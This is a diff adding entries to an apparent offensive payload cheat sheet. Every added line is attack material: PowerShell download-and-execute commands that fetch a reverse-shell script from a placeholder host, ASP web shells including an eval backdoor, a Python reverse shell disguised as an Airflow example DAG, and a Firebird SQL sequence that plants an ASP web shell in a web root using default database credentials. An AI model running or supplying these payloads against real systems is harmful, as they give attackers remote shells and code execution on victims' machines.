@@ -443,6 +443,18 @@ powershell.exe "iex(iwr -usebasicparsing http://{IP}/Invoke-PowerShellTcp.ps1)"
 
 powershell.exe -e {BASE64PS1}
 
+#EXAMPLE
+
+=> Original : IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1')
+
+powershell.exe -e {BASE64PS1_2}
+
+#EXAMPLE
+
+=> Original : IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}
+
+powershell.exe -e {BASE64PS1_3}
+
 #INDEX
 
 #EXAMPLE
@@ -1141,6 +1153,22 @@ Response.write(o)
 %>
 -->
 
+#EXAMPLE
+
+=> Original (From Base64) : IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1
+
+<% response.write CreateObject("WScript.Shell").Exec("cmd /c powershell.exe -e {BASE64PS1_2}").StdOut.Readall() %>
+
+#EXAMPLE
+
+=> Original (From Base64) : IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1;Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}
+
+<% response.write CreateObject("WScript.Shell").Exec("cmd /c powershell.exe -e {BASE64PS1_3}").StdOut.Readall() %>
+
+#EXAMPLE
+
+<% eval request("cmd") %>
+
 #INDEX
 
 #EXAMPLE
@@ -1599,6 +1627,51 @@ msfvenom -p linux/x64/exec CMD='sudo usermod -aG sudo username' EXITFUNC=none --
 msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o shell.elf
 
 msfvenom -p linux/x86/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o shell.elf
+
+#INDEX
+
+#EXAMPLE
+
+=> Save it as script.py and put into /dags directory
+
+"""Example DAG demonstrating the usage of the PythonOperator."""
+from airflow import DAG
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{IP}",{PORT}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+#INDEX
+
+#EXAMPLE
+
+=> Save this as exploit.sql and transfer to victim machine.
+
+CREATE TABLE a( x blob);
+ALTER DATABASE ADD DIFFERENCE FILE 'C:\inetpub\wwwroot\shell.asp';
+ALTER DATABASE BEGIN BACKUP;
+INSERT INTO a VALUES ('<% response.write CreateObject("WScript.Shell").Exec("cmd /c powershell.exe -e {BASE64PS1_2}").StdOut.Readall() %>');
+COMMIT;
+DROP DATABASE;
+
+=> Make sure to put this at the end of Invoke-PowerShellTcp.ps1
+
+Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}
+
+=> Execute this commands on Victim Machine.
+
+upload /tmp/exploit.sql c:\users\dev\Downloads\exploit.sql (Using evil-winrm)
+echo "CREATE DATABASE 'C:\nonexist' user 'SYSDBA' password 'masterkey';" | .\isql.exe -u SYSDBA -p masterkey security4.fdb
+.\isql.exe -user SYSDBA -password masterkey \NONEXIST -b -i c:\users\dev\Downloads\exploit.sql
+
+
+=> Open shell.asp on web
 
 
 
